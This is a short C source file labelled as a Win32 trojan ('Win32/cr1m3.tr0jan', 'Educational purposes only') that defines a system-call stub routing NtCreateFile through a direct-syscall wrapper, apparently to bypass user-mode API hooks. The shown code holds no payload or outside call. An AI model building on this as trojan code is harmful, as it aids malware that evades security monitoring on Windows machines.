/*
	Educational purposes only
	GPL LICENSE:  @Cr1m3 / JennyLab
	Win32/cr1m3.tr0jan
*/

#include "api.h"
#include "windows.h"
#include "misc.h"
#include "syscall.h"





unsigned long __syscallstub(int syscall) {
	int ret;
	switch (syscall) {
	case 0x25: //"NtCreateFile"
		JMP_FUNCRET(__sys0x25_NTCreateFile);
		break;
	}

	__asm { mov ret, eax } 
	return(ret);
}

unsigned long __sys0x25_NTCreateFile(void	**FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK   IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, unsigned long CreateDisposition, unsigned long CreateOptions, void *EaBuffer, unsigned long EaLength) {
	return(_NtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition,CreateOptions,EaBuffer,EaLength));
}
